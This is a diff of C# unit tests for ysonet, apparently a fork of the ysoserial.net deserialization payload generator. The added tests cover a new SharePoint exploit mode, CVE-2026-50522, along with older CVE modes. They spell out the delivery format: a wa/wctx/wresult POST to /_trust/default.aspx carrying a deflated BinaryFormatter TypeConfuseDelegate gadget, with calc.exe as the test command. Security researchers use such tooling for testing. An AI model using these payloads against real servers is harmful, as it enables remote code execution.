@@ -84,6 +84,13 @@ namespace ysonet.Tests
             Run("DotNetNuke modes select the payload mode and pass the right args", DotNetNukeModes);
             Run("Clipboard modes scope format vs xamlvariant per mode", ClipboardModes);
             Run("SharePoint modes select the CVE and scope its inner setting", SharePointModes);
+            Run("SharePoint CVE-2026-50522 default output is the wresult token plus a delivery comment", SharePointCve2026Framing);
+            Run("SharePoint CVE-2026-50522 --formbody emits the full wa/wctx/wresult body", SharePointCve2026FormBody);
+            Run("SharePoint CVE-2026-50522 validates its target and gadget inputs", SharePointCve2026Validation);
+            Run("SharePoint --no-comment suppresses the explanatory comment", SharePointNoComment);
+            Run("SharePoint honors --rawcmd instead of hardcoding it", SharePointRawcmdConfigurable);
+            Run("ApplicationTrust --no-comment outputs clean XML", ApplicationTrustNoComment);
+            Run("Command plugins expose --rawcmd (and SharePoint --minify/--ust/--no-comment)", CommandPluginsExposeConfigFlags);
             Run("A space sets an explicit empty string, distinct from unset", ExplicitEmptyStringViaSpace);
             Run("Interactive banner marks beta and shows the version", BannerShowsBetaAndVersion);
             Run("Show-command action prints the one-liner without generating", WizardShowCommand);
@@ -1412,21 +1419,26 @@ namespace ysonet.Tests
             var editor = new ModuleEditor(null, null, false, null, null);
             var f = editor.BuildFieldsForTest("SharePoint");
             EditableField mode = FindEditable(f, "mode");
-            AssertTrue(mode != null && mode.Choices.Count == 6, "six SharePoint CVE modes");
+            AssertTrue(mode != null && mode.Choices.Count == 7, "seven SharePoint CVE modes");
             // The CVE selector is the mode picker, not a duplicate 'cve' field.
             AssertTrue(FindEditable(f, "cve") == null, "cve is the mode, not a separate field");
 
-            // Default = CVE-2025-49704: inner 'variant' shown; gadget/useurl hidden.
+            // Default = CVE-2025-49704: inner 'variant' shown; gadget/useurl/target hidden.
             AssertTrue(FindEditable(f, "command").Required, "command required");
             AssertTrue(!FindEditable(f, "variant").Hidden, "49704: inner variant shown");
             AssertTrue(FindEditable(f, "gadget").Hidden && FindEditable(f, "useurl").Hidden, "49704: gadget/useurl hidden");
+            AssertTrue(FindEditable(f, "target").Hidden, "49704: target hidden");
             FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
             string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
             AssertTrue(a1.Contains("--cve CVE-2025-49704"), "49704 argv has cve: " + a1);
-            AssertTrue(!a1.Contains("--gadget") && !a1.Contains("--useurl"), "49704 argv excludes gadget/useurl");
+            AssertTrue(!a1.Contains("--gadget") && !a1.Contains("--useurl") && !a1.Contains("--target"),
+                "49704 argv excludes gadget/useurl/target");
 
-            // Switch to CVE-2020-1147: inner 'gadget' shown; it generates via CLI.
-            mode.Value = mode.Choices[3];
+            // Modes are selected by their CVE identity, not a brittle list index, so
+            // adding a mode never silently shifts what these checks target.
+
+            // CVE-2020-1147: inner 'gadget' shown; it generates via CLI.
+            mode.Value = PickModeByCve(mode, "CVE-2020-1147");
             editor.RefreshDynamicForTest();
             AssertTrue(!FindEditable(f, "gadget").Hidden, "1147: gadget shown");
             AssertTrue(FindEditable(f, "variant").Hidden, "1147: variant hidden");
@@ -1435,14 +1447,351 @@ namespace ysonet.Tests
             RunResult r2 = PayloadRunner.RunPlugin("SharePoint", editor.PluginArgvForTest().ToArray());
             AssertTrue(r2.Success, "1147 generates via CLI args: " + r2.ErrorMessage);
 
-            // Switch to CVE-2018-8421: inner 'useurl' shown; it generates via CLI.
-            mode.Value = mode.Choices[5];
+            // CVE-2018-8421: inner 'useurl' shown; it generates via CLI.
+            mode.Value = PickModeByCve(mode, "CVE-2018-8421");
             editor.RefreshDynamicForTest();
             AssertTrue(!FindEditable(f, "useurl").Hidden, "8421: useurl shown");
             string a3 = string.Join(" ", editor.PluginArgvForTest().ToArray());
             AssertTrue(a3.Contains("--cve CVE-2018-8421"), "8421 argv: " + a3);
             RunResult r3 = PayloadRunner.RunPlugin("SharePoint", editor.PluginArgvForTest().ToArray());
             AssertTrue(r3.Success, "8421 generates via CLI args: " + r3.ErrorMessage);
+
+            // CVE-2026-50522: command, target, gadget, and the formbody switch shown;
+            // only command is required (target is transport, needed just for --formbody).
+            // The unrelated variant/useurl fields stay hidden. Argv carries the cve,
+            // target, and gadget, and it generates via CLI (default = wresult token).
+            mode.Value = PickModeByCve(mode, "CVE-2026-50522");
+            editor.RefreshDynamicForTest();
+            AssertTrue(!FindEditable(f, "command").Hidden && !FindEditable(f, "target").Hidden
+                && !FindEditable(f, "gadget").Hidden && !FindEditable(f, "formbody").Hidden,
+                "2026-50522: command/target/gadget/formbody shown");
+            AssertTrue(FindEditable(f, "command").Required && !FindEditable(f, "target").Required,
+                "2026-50522: command required, target optional");
+            AssertTrue(FindEditable(f, "variant").Hidden && FindEditable(f, "useurl").Hidden,
+                "2026-50522: variant/useurl hidden");
+            FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
+            FindEditable(f, "target").Value = "https://sharepoint.example/"; FindEditable(f, "target").Touched = true;
+            string a4 = string.Join(" ", editor.PluginArgvForTest().ToArray());
+            AssertTrue(a4.Contains("--cve CVE-2026-50522") && a4.Contains("--target") && a4.Contains("--gadget"),
+                "2026-50522 argv: " + a4);
+            RunResult r4 = PayloadRunner.RunPlugin("SharePoint", editor.PluginArgvForTest().ToArray());
+            AssertTrue(r4.Success, "2026-50522 generates via CLI args: " + r4.ErrorMessage);
+        }
+
+        // Selects a SharePoint interactive mode by its CVE identity (the mode Name),
+        // so adding a mode never silently shifts a positional index.
+        private static string PickModeByCve(EditableField mode, string cveId)
+        {
+            foreach (string choice in mode.Choices)
+                if (choice.IndexOf(cveId, StringComparison.OrdinalIgnoreCase) >= 0)
+                    return choice;
+            throw new Exception("no SharePoint mode choice found for " + cveId);
+        }
+
+        // CVE-2026-50522 DEFAULT output framing. The default is the wresult token XML plus
+        // a delivery comment (like the other SharePoint modes), NOT a form body. Inspects
+        // the token layer by layer (RSTR/SCT XML -> Base64 -> deflate -> BF header) WITHOUT
+        // ever deserializing or firing the embedded gadget.
+        private static void SharePointCve2026Framing()
+        {
+            RunResult r = PayloadRunner.RunPlugin("SharePoint", new[]
+            {
+                "--cve", "CVE-2026-50522",
+                "--target", "https://sharepoint.example/",
+                "--gadget", "TypeConfuseDelegate",
+                "-c", "calc.exe",
+            });
+            AssertTrue(r.Success, "2026-50522 generates: " + r.ErrorMessage);
+            string output = r.Raw as string;
+            AssertTrue(!string.IsNullOrEmpty(output), "2026-50522 returns a string");
+
+            // Default output is the token, not a form body: it must NOT start with the
+            // url-encoded wa field, and it must carry a delivery comment that shows the POST.
+            AssertTrue(!output.StartsWith("wa="), "default output is the token, not a form body: " + output);
+            int commentAt = output.IndexOf("<!--", StringComparison.Ordinal);
+            AssertTrue(commentAt > 0, "default output has a delivery comment");
+            string comment = output.Substring(commentAt);
+            AssertTrue(comment.Contains("wa=wsignin1.0") && comment.Contains("wctx=") && comment.Contains("wresult="),
+                "the comment shows the wa/wctx/wresult fields");
+            AssertTrue(comment.Contains("/_trust/default.aspx"), "the comment names the trust endpoint");
+            AssertTrue(comment.Contains("--formbody"), "the comment points at --formbody for the full body");
+            // The provided --target is echoed as the wctx example in the comment.
+            AssertTrue(comment.Contains("wctx=https://sharepoint.example/"), "the comment uses the given target as the wctx example: " + comment);
+
+            // The part before the comment is the wresult token XML. Inspect it in depth.
+            string wresult = output.Substring(0, commentAt).Trim();
+            AssertTrue(XmlWellFormednessError(wresult) == null, "wresult is well-formed XML");
+            AssertSharePoint2026TokenStructure(wresult);
+        }
+
+        // CVE-2026-50522 --formbody output framing. This mode emits the complete
+        // URL-encoded wa/wctx/wresult sign-in body. Inspects it layer by layer WITHOUT
+        // deserializing or firing the embedded gadget.
+        private static void SharePointCve2026FormBody()
+        {
+            RunResult r = PayloadRunner.RunPlugin("SharePoint", new[]
+            {
+                "--cve", "CVE-2026-50522",
+                "--formbody",
+                "--target", "https://sharepoint.example/",
+                "--gadget", "TypeConfuseDelegate",
+                "-c", "calc.exe",
+            });
+            AssertTrue(r.Success, "2026-50522 --formbody generates: " + r.ErrorMessage);
+            string body = r.Raw as string;
+            AssertTrue(!string.IsNullOrEmpty(body), "2026-50522 --formbody returns a string form body");
+
+            // Exactly three fields, in a deterministic order, with no trailing text.
+            string[] fields = body.Split('&');
+            AssertTrue(fields.Length == 3, "form body has exactly three fields: " + body);
+            AssertTrue(fields[0].StartsWith("wa=") && fields[1].StartsWith("wctx=") && fields[2].StartsWith("wresult="),
+                "form fields are wa, wctx, wresult in order: " + body);
+
+            string wa = System.Web.HttpUtility.UrlDecode(fields[0].Substring("wa=".Length));
+            string wctx = System.Web.HttpUtility.UrlDecode(fields[1].Substring("wctx=".Length));
+            string wresult = System.Web.HttpUtility.UrlDecode(fields[2].Substring("wresult=".Length));
+
+            AssertEqual("wsignin1.0", wa, "wa is the sign-in action");
+            AssertEqual("https://sharepoint.example/", wctx, "wctx is the normalized target base URL");
+            AssertTrue(XmlWellFormednessError(wresult) == null, "wresult is well-formed XML");
+            AssertSharePoint2026TokenStructure(wresult);
+        }
+
+        // Parses a CVE-2026-50522 wresult token safely (no DTD) and asserts the
+        // trust/SCT/cookie structure, the identifier shape, and that the cookie inflates
+        // to a BinaryFormatter stream. Never deserializes the payload.
+        private static void AssertSharePoint2026TokenStructure(string wresult)
+        {
+            var doc = new System.Xml.XmlDocument();
+            using (var xr = System.Xml.XmlReader.Create(new StringReader(wresult),
+                new System.Xml.XmlReaderSettings { DtdProcessing = System.Xml.DtdProcessing.Prohibit }))
+            {
+                doc.Load(xr);
+            }
+
+            const string nsTrust = "http://schemas.xmlsoap.org/ws/2005/02/trust";
+            const string nsSc = "http://schemas.xmlsoap.org/ws/2005/02/sc";
+            const string nsSecurity = "http://schemas.microsoft.com/ws/2006/05/security";
+
+            System.Xml.XmlElement rstr = doc.DocumentElement;
+            AssertEqual("RequestSecurityTokenResponse", rstr.LocalName, "root is RequestSecurityTokenResponse");
+            AssertEqual(nsTrust, rstr.NamespaceURI, "RSTR is in the trust namespace");
+
+            System.Xml.XmlElement requested = FirstChildElement(rstr);
+            AssertEqual("RequestedSecurityToken", requested.LocalName, "RSTR wraps RequestedSecurityToken");
+            AssertEqual(nsTrust, requested.NamespaceURI, "RequestedSecurityToken is in the trust namespace");
+
+            System.Xml.XmlElement sct = FirstChildElement(requested);
+            AssertEqual("SecurityContextToken", sct.LocalName, "it holds a SecurityContextToken");
+            AssertEqual(nsSc, sct.NamespaceURI, "SCT is in the security-context namespace");
+
+            System.Xml.XmlElement identifier = ChildByLocalName(sct, "Identifier");
+            AssertTrue(identifier != null && identifier.NamespaceURI == nsSc, "SCT has an Identifier in the sc namespace");
+            System.Xml.XmlElement cookie = ChildByLocalName(sct, "Cookie");
+            AssertTrue(cookie != null && cookie.NamespaceURI == nsSecurity, "SCT has a Cookie in the security namespace");
+
+            // Identifier shape: urn:unique-id:securitycontext:<32 lowercase hex Guid chars>.
+            const string idPrefix = "urn:unique-id:securitycontext:";
+            string id = identifier.InnerText.Trim();
+            AssertTrue(id.StartsWith(idPrefix, StringComparison.Ordinal), "identifier has the urn prefix: " + id);
+            string guidPart = id.Substring(idPrefix.Length);
+            AssertTrue(guidPart.Length == 32, "identifier ends with a 32-char Guid: " + id);
+            foreach (char ch in guidPart)
+                AssertTrue((ch >= '0' && ch <= '9') || (ch >= 'a' && ch <= 'f'), "Guid N is lowercase hex: " + id);
+
+            // Cookie = Base64(Deflate(BinaryFormatter gadget)). Decode and inflate, then
+            // assert a BinaryFormatter stream header. Never deserialize it.
+            byte[] deflated = Convert.FromBase64String(cookie.InnerText.Trim());
+            byte[] bf;
+            using (var input = new MemoryStream(deflated))
+            using (var ds = new System.IO.Compression.DeflateStream(input, System.IO.Compression.CompressionMode.Decompress))
+            using (var output = new MemoryStream())
+            {
+                ds.CopyTo(output);
+                bf = output.ToArray();
+            }
+            byte[] head = new byte[] { 0, 1, 0, 0, 0, 255, 255, 255, 255 };
+            bool okHead = bf.Length > head.Length;
+            for (int i = 0; okHead && i < head.Length; i++) if (bf[i] != head[i]) okHead = false;
+            AssertTrue(okHead, "the cookie inflates to a BinaryFormatter stream");
+        }
+
+        // CVE-2026-50522 input validation. Every case inspects the error, never a payload.
+        private static void SharePointCve2026Validation()
+        {
+            const string goodTarget = "https://sharepoint.example/";
+
+            // A valid run first, so leftover statics cannot make a negative case pass by
+            // accident later. This also proves the default (token) happy path from the CLI.
+            RunResult ok = RunSharePoint2026("calc.exe", goodTarget, "TypeConfuseDelegate", true);
+            AssertTrue(ok.Success, "valid 2026-50522 run succeeds: " + ok.ErrorMessage);
+
+            // The default token output does NOT need --target (wctx is transport only).
+            RunResult noTargetDefault = RunSharePoint2026("calc.exe", null, "TypeConfuseDelegate", false);
+            AssertTrue(noTargetDefault.Success, "default token output works without --target: " + noTargetDefault.ErrorMessage);
+            AssertTrue(!(noTargetDefault.Raw as string).StartsWith("wa="), "default output without --target is the token, not a form body");
+
+            // --formbody DOES require --target (it fills wctx).
+            RunResult formNoTarget = RunSharePoint2026("calc.exe", null, "TypeConfuseDelegate", false, true);
+            AssertTrue(!formNoTarget.Success && formNoTarget.ErrorMessage.IndexOf("target", StringComparison.OrdinalIgnoreCase) >= 0,
+                "--formbody without --target is rejected: " + formNoTarget.ErrorMessage);
+
+            // --formbody with a good target succeeds and yields a url-encoded form body.
+            RunResult formOk = RunSharePoint2026("calc.exe", goodTarget, "TypeConfuseDelegate", true, true);
+            AssertTrue(formOk.Success && (formOk.Raw as string).StartsWith("wa="),
+                "--formbody with --target yields a form body: " + formOk.ErrorMessage);
+
+            // Relative target.
+            RunResult relative = RunSharePoint2026("calc.exe", "/sites/x", "TypeConfuseDelegate", true);
+            AssertTrue(!relative.Success && relative.ErrorMessage.IndexOf("absolute", StringComparison.OrdinalIgnoreCase) >= 0,
+                "relative target is rejected: " + relative.ErrorMessage);
+
+            // Non-HTTP(S) target.
+            RunResult ftp = RunSharePoint2026("calc.exe", "ftp://host/", "TypeConfuseDelegate", true);
+            AssertTrue(!ftp.Success && ftp.ErrorMessage.IndexOf("http", StringComparison.OrdinalIgnoreCase) >= 0,
+                "non-http target is rejected: " + ftp.ErrorMessage);
+
+            // Target with a query string, a fragment, or user info.
+            RunResult query = RunSharePoint2026("calc.exe", "https://host/?a=1", "TypeConfuseDelegate", true);
+            AssertTrue(!query.Success, "target with query is rejected: " + query.ErrorMessage);
+            RunResult frag = RunSharePoint2026("calc.exe", "https://host/#x", "TypeConfuseDelegate", true);
+            AssertTrue(!frag.Success, "target with fragment is rejected: " + frag.ErrorMessage);
+            RunResult userinfo = RunSharePoint2026("calc.exe", "https://user:pass@host/", "TypeConfuseDelegate", true);
+            AssertTrue(!userinfo.Success, "target with user info is rejected: " + userinfo.ErrorMessage);
+
+            // Unknown gadget.
+            RunResult unknownGadget = RunSharePoint2026("calc.exe", goodTarget, "NoSuchGadget_2026", true);
+            AssertTrue(!unknownGadget.Success && unknownGadget.ErrorMessage.IndexOf("Gadget", StringComparison.OrdinalIgnoreCase) >= 0,
+                "unknown gadget is rejected: " + unknownGadget.ErrorMessage);
+
+            // Known gadget without BinaryFormatter support (ObjectDataProvider is Xaml/Json only).
+            RunResult noBf = RunSharePoint2026("calc.exe", goodTarget, "ObjectDataProvider", true);
+            AssertTrue(!noBf.Success && noBf.ErrorMessage.IndexOf("BinaryFormatter", StringComparison.OrdinalIgnoreCase) >= 0,
+                "a gadget without BinaryFormatter support is rejected: " + noBf.ErrorMessage);
+
+            // Missing command (reset the static so a leftover value cannot satisfy it).
+            ResetStaticString(typeof(ysonet.Plugins.SharePointPlugin), "command", "");
+            RunResult noCommand = PayloadRunner.RunPlugin("SharePoint", new[]
+            {
+                "--cve", "CVE-2026-50522", "--target", goodTarget, "--gadget", "TypeConfuseDelegate",
+            });
+            AssertTrue(!noCommand.Success, "missing command is rejected: " + noCommand.ErrorMessage);
+
+            // An older SharePoint mode still works without --target, proving the option
+            // is mode-specific and did not leak in as a global requirement.
+            RunResult older = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2018-8421", "-c", "calc.exe" });
+            AssertTrue(older.Success, "an older SharePoint CVE still generates without --target: " + older.ErrorMessage);
+        }
+
+        // Runs SharePoint CVE-2026-50522 with explicit inputs. Resets the leaky static
+        // command/gadget fields first so each call is order-independent; production
+        // already resets target on every run. When target is null, --target is omitted.
+        private static RunResult RunSharePoint2026(string command, string target, string gadget, bool passTarget, bool useFormBody = false)
+        {
+            ResetStaticString(typeof(ysonet.Plugins.SharePointPlugin), "command", "");
+            ResetStaticString(typeof(ysonet.Plugins.SharePointPlugin), "gadget", "TypeConfuseDelegate");
+            // The formBody static is reset by the plugin on every run, so each call is
+            // order-independent regardless of a prior --formbody run.
+            var argv = new List<string> { "--cve", "CVE-2026-50522", "-c", command, "--gadget", gadget };
+            if (useFormBody) argv.Add("--formbody");
+            if (passTarget && target != null)
+            {
+                argv.Add("--target");
+                argv.Add(target);
+            }
+            return PayloadRunner.RunPlugin("SharePoint", argv.ToArray());
+        }
+
+        // --no-comment strips the trailing explanatory HTML comment from SharePoint
+        // output, for a comment-bearing CVE (2020-1147, no external DLLs) and for the
+        // 2026 token. Without the flag the comment is present.
+        private static void SharePointNoComment()
+        {
+            RunResult withC = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2020-1147", "-c", "calc.exe" });
+            AssertTrue(withC.Success, "2020-1147 generates: " + withC.ErrorMessage);
+            AssertTrue((withC.Raw as string).Contains("<!--"), "default output includes the explanatory comment");
+
+            RunResult noC = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2020-1147", "-c", "calc.exe", "--no-comment" });
+            AssertTrue(noC.Success, "2020-1147 --no-comment generates: " + noC.ErrorMessage);
+            AssertTrue(!(noC.Raw as string).Contains("<!--"), "--no-comment removes the explanatory comment");
+
+            // The 2026 default token also drops its delivery comment and returns just the token.
+            RunResult tok = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2026-50522", "-c", "calc.exe", "--no-comment" });
+            AssertTrue(tok.Success, "2026-50522 --no-comment generates: " + tok.ErrorMessage);
+            string tokS = tok.Raw as string;
+            AssertTrue(!tokS.Contains("<!--") && tokS.StartsWith("<RequestSecurityTokenResponse"),
+                "2026-50522 --no-comment returns just the wresult token: " + tokS);
+        }
+
+        // rawcmd is threaded into the SharePoint gadget, not hardcoded: toggling it changes
+        // the embedded command (cmd /c X vs X), hence the payload bytes. Compare the raw
+        // payload (via --no-comment so only the payload differs, not any comment text).
+        private static void SharePointRawcmdConfigurable()
+        {
+            RunResult def = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2020-1147", "-c", "calc.exe", "--no-comment" });
+            RunResult raw = PayloadRunner.RunPlugin("SharePoint", new[] { "--cve", "CVE-2020-1147", "-c", "calc.exe", "--no-comment", "--rawcmd" });
+            AssertTrue(def.Success && raw.Success, "both 2020-1147 runs generate");
+            AssertTrue((def.Raw as string) != (raw.Raw as string),
+                "--rawcmd changes the SharePoint payload (the flag is honored, not hardcoded)");
+        }
+
+        // ApplicationTrust embeds an optional commented-out block; --no-comment drops it,
+        // leaving clean ApplicationTrust XML.
+        private static void ApplicationTrustNoComment()
+        {
+            RunResult with = PayloadRunner.RunPlugin("ApplicationTrust", new[] { "-c", "calc.exe" });
+            AssertTrue(with.Success && (with.Raw as string).Contains("<!--"),
+                "ApplicationTrust default includes the comment: " + with.ErrorMessage);
+            RunResult without = PayloadRunner.RunPlugin("ApplicationTrust", new[] { "-c", "calc.exe", "--no-comment" });
+            AssertTrue(without.Success, "ApplicationTrust --no-comment generates: " + without.ErrorMessage);
+            string s = without.Raw as string;
+            AssertTrue(!s.Contains("<!--") && s.Contains("<ApplicationTrust"),
+                "--no-comment leaves clean ApplicationTrust XML with no comment: " + s);
+        }
+
+        // Every command-taking plugin exposes --rawcmd (consistency with ViewState), and
+        // SharePoint additionally exposes --minify/--usesimpletype/--no-comment. Locks in
+        // the config-flag consistency so a future plugin cannot silently hardcode them.
+        private static void CommandPluginsExposeConfigFlags()
+        {
+            string[] cmdPlugins =
+            {
+                "Resx", "DotNetNuke", "ApplicationTrust", "Altserialization", "Clipboard",
+                "TransactionManagerReenlist", "SessionSecurityTokenHandler",
+                "MachineKeySessionSecurityTokenHandler", "ViewState", "SharePoint",
+            };
+            foreach (string p in cmdPlugins)
+            {
+                IPlugin inst = PluginRegistry.CreatePluginInstance(p);
+                AssertTrue(inst != null, p + " loads");
+                var fields = OptionField.FromOptionSet(inst.Options());
+                AssertTrue(FindField(fields, "rawcmd") != null, p + " exposes --rawcmd");
+            }
+
+            var spFields = OptionField.FromOptionSet(PluginRegistry.CreatePluginInstance("SharePoint").Options());
+            AssertTrue(FindField(spFields, "minify") != null, "SharePoint exposes --minify");
+            AssertTrue(FindField(spFields, "usesimpletype") != null, "SharePoint exposes --ust/--usesimpletype");
+            AssertTrue(FindField(spFields, "no-comment") != null, "SharePoint exposes --no-comment");
+        }
+
+        private static void ResetStaticString(Type t, string field, string value)
+        {
+            var f = t.GetField(field, System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
+            if (f != null && f.FieldType == typeof(string)) f.SetValue(null, value);
+        }
+
+        private static System.Xml.XmlElement FirstChildElement(System.Xml.XmlElement parent)
+        {
+            foreach (System.Xml.XmlNode n in parent.ChildNodes)
+                if (n is System.Xml.XmlElement) return (System.Xml.XmlElement)n;
+            throw new Exception("no child element under " + parent.LocalName);
+        }
+
+        private static System.Xml.XmlElement ChildByLocalName(System.Xml.XmlElement parent, string localName)
+        {
+            foreach (System.Xml.XmlNode n in parent.ChildNodes)
+                if (n is System.Xml.XmlElement && n.LocalName == localName) return (System.Xml.XmlElement)n;
+            return null;
         }
 
         private static void BannerShowsBetaAndVersion()
@@ -3714,6 +4063,9 @@ namespace ysonet.Tests
                 new PluginCell("SharePoint", new[] { "--cve", "CVE-2025-49704", "-c", csFixture, "--variant", "2" }),
                 // CVE-2025-53770 (ToolShell patch bypass) compiles -c as a .cs file, like 49704 variant 2.
                 new PluginCell("SharePoint", new[] { "--cve", "CVE-2025-53770", "-c", csFixture }),
+                // CVE-2026-50522 needs an explicit --target (the wctx base URL) and a BinaryFormatter gadget.
+                new PluginCell("SharePoint", new[] { "--cve", "CVE-2026-50522", "--target", "https://sharepoint.example/", "--gadget", "TypeConfuseDelegate", "-c", "calc.exe" }),
+                new PluginCell("SharePoint", new[] { "--cve", "CVE-2026-50522", "--formbody", "--target", "https://sharepoint.example/", "--gadget", "TypeConfuseDelegate", "-c", "calc.exe" }),
 
                 // Remote-DLL-load gadgets with a natural UNC path: the plugin JSON-escapes the
                 // input by default now, so the backslashes survive generation and the --minify
